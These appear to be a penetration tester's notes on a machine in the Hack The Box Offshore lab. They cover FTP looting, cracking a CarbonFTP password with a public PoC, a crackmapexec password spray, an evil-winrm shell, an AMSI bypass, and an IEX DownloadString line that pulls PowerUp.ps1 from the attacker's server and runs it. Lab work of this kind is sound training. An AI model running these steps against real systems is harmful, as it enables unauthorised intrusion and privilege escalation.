## Initial Access
to touch this machine must go through .123 proxychains to touch internal network
```bash
#Machine Information
HOSTNAME: JOE-LPTP
IP: 172.16.1.201
CREDENTIALS: JOE : Dev0ftheyear!
```
#nmap 
```bash
[root💀~/bugs_offshore/10.10.110.123] [10.10.14.39] [2023-08-08 16:25:34] 
 └─╼ # proxychains nmap -sT -Pn -v 172.16.1.201
Completed Connect Scan at 16:25, 78.76s elapsed (1000 total ports)
Nmap scan report for 172.16.1.201
Host is up (0.085s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp     # ran down anonymous and got credentials
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5800/tcp open  vnc-http
5900/tcp open  vnc   # Relevant later.
```
#1st #flag 
```bash
#the first flag was located on the desktop of the anonymous ftp session
[root💀~/bugs_offshore/172.16.1.201] [10.10.14.39] [2023-08-08 15:45:37] 
 └─╼ # cat flag.txt
OFFSHORE{st0p_us1ng_fr33warez!}
```

![[1ST FLAG.png]]
In the same location of the flag.txt was a Carbon FTP.lnk file. After pulling it down I researched Carbon FTP and found this PoC
![[CARBON FTP.png]]

- This PoC showed the location of where the password file is located under AppData
- the full path ended up being /appdata/roaming/neowise/CarbonFTPProjects
- I used the ftp get command to pull both the 2nd flag.txt as well as the password file.
![[FTP FLAG2.png]]
```bash
#flag2
[root💀~/bugs_offshore/172.16.1.201/flags] [10.10.14.39] [2023-08-08 15:58:17] 
 └─╼ # cat flag2.txt
OFFSHORE{An0N_FtP_c@n_rev3al_tr3asUre$}
```

![[2ND FLAG.png]]
I then pulled that PoC before onto my kali machine and used the command  below to crack the password
```bash
[root💀~/bugs_offshore/172.16.1.201] [10.10.14.39] [2023-08-08 16:02:12] 
 └─╼ # python3 48363.py -p 19852327402859129171335082736410993
[+] Neowise CarbonFTP v1.4
[+] CVE-2020-6857 Insecure Proprietary Password Encryption
[+] Version 2 Exploit fixed for Python 3 compatibility
[+] Discovered and cracked by hyp3rlinx
[+] ApparitionSec

 Decrypting ... 

[-] 19852
[-] 32740
[-] 28591
[-] 29171
[-] 33508
[-] 27364
[-] 10993
[+] PASSWORD LENGTH: 13
[*] DECRYPTED PASSWORD: Dev0ftheyear!
```

#crackmapexec
#joe #passwordspray
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/172.16.1.201 - JOE-LPTP/screenshots/JOE PASSWORD SPRAY.png]]
```bash
# utilized this command to password spray across /24 domain
[root💀~/bugs_offshore/172.16.1.201] [10.10.14.39] [2023-08-08 16:31:13] 
 └─╼ # proxychains crackmapexec smb 172.16.1.0/24 -u 'joe' -p 'Dev0ftheyear!' > joe_hack_24_pwdspray.txt
```

found that the user joe exists on ip addresses:
172.16.1.200 (DC0)
172.16.1.201 (JOE-LPTP)
172.16.1.220 (SRV01)

cant really do anything with the credentials at this point, going to try to laterally move to DC0 with the credentials that joe has since I know he exists there

#rpclient
had to first make a rpc_joe text document with the fields below, and make sure to put -A in to utilize the file
![[RPC JOE.png]]
#crackmapexec #evil-winrm
### ALWAYS SCAN PORT 5985 TO SEE IF WINRM IS OPEN ON WINDOWS DEVICE
```bash
#winrm is allowed on JOE-LPTP
[root💀~/bugs_offshore/10.10.110.123] [10.10.14.39] [2023-08-08 17:48:27] 
 └─╼ # proxychains crackmapexec winrm 172.16.1.201 -u joe -p Dev0ftheyear!
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5986 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:445  ...  OK
SMB         172.16.1.201    5985   JOE-LPTP         [*] Windows 10.0 Build 19041 (name:JOE-LPTP) (domain:JOE-LPTP)
HTTP        172.16.1.201    5985   JOE-LPTP         [*] http://172.16.1.201:5985/wsman
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
WINRM       172.16.1.201    5985   JOE-LPTP         [+] JOE-LPTP\joe:Dev0ftheyear! (Pwn3d!)
[root💀~/bugs_offshore/10.10.110.123] [10.10.14.39] [2023-08-08 17:53:45] 


[root💀~/bugs_offshore/10.10.110.123] [10.10.14.39] [2023-08-08 17:53:45] 
 └─╼ # proxychains evil-winrm -i 172.16.1.201 -u joe -p Dev0ftheyear!
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
*Evil-WinRM* PS C:\Users\joe\Documents> whoami
joe-lptp\joe

```

```bash

# to lookup firewall rules

Display all dynamic inbound rules:
netsh advfirewall firewall show rule name=all dir=in type=dynamic

# windows defender
Evil-WinRM* PS C:\Users\joe\Documents> netsh firewall show state
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Disable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable
Group policy version              = Windows Defender Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
No ports are currently open on all network interfaces.

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at https://go.microsoft.com/fwlink/?linkid=121488 .


```
## Privilege Escalation

- `have to first bypass AMSI`
```powershell
*Evil-WinRM* PS C:\Users\joe\Documents> menu
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\joe\Documents> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
```

- `host python server to be able to invoke powerup`
```bash
[root💀/opt/PowerSploit/Privesc] [10.10.14.39] [2023-08-09 12:36:00] 
 └─╼ # python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- `ran PowerUp.ps1, still got errors but it ended up working`
- `two commands were ran:
	- `IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.39:8000/PowerUp.ps1'))
	- `invoke-allchecks`
```powershell
*Evil-WinRM* PS C:\Users\joe\Documents> IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.39:8000/PowerUp.ps1'))
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
*Evil-WinRM* PS C:\Users\joe\Documents> invoke-allchecks
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  172.16.1.201:5985  ...  OK
Access denied 
At line:2066 char:21
+     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
Access denied 
At line:2133 char:5
+     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At line:2189 char:5
+     Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeCo ...
+     ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand


ModifiablePath    : C:\Users\joe\AppData\Local\Microsoft\WindowsApps
IdentityReference : JOE-LPTP\joe
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\joe\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\joe\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\joe\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

ModifiablePath    : C:\Users\joe\AppData\Local\Programs\Microsoft VS Code\bin
IdentityReference : JOE-LPTP\joe
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\joe\AppData\Local\Programs\Microsoft VS Code\bin
Name              : C:\Users\joe\AppData\Local\Programs\Microsoft VS Code\bin
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\joe\AppData\Local\Programs\Microsoft VS Code\bin\wlbsctrl.dll'
```
- looking for priv esc way forward
- looked at services, got hint from bellinger that spoolsv.exe is running on system
- looked up location of spoolsv.exe and looked in the location **c:\windows\system32** `
- looking up privilege escalation

## Privesc Notes
[[Privesc Enumeration]]
[[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/172.16.1.201 - JOE-LPTP/Privesc Notes]]
